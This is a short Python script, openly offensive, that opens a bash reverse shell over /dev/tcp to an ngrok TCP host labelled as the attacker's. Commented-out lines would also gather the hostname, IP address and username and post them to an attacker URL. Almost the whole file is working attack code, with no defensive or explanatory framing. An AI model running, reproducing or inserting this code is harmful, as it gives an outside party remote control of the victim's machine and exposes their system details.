import os
import socket
import requests
import subprocess

# 🔹 Ngrok HTTP URL (Replace this)
#ATTACKER_URL = "https://random-subdomain.ngrok.io/log"

# 🔹 Ngrok TCP Details (Replace this)
ATTACKER_IP = "0.tcp.in.ngrok.io"
ATTACKER_PORT = 18191

# Collect System Info
#hostname = socket.gethostname()
#ip_address = socket.gethostbyname(hostname)
#username = os.getenv("USER") or os.getenv("USERNAME")

# Send data to attacker's server
#requests.post(ATTACKER_URL, json={"host": hostname, "ip": ip_address, "user": username})

# Reverse Shell
subprocess.call(["/bin/bash", "-c", f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"])

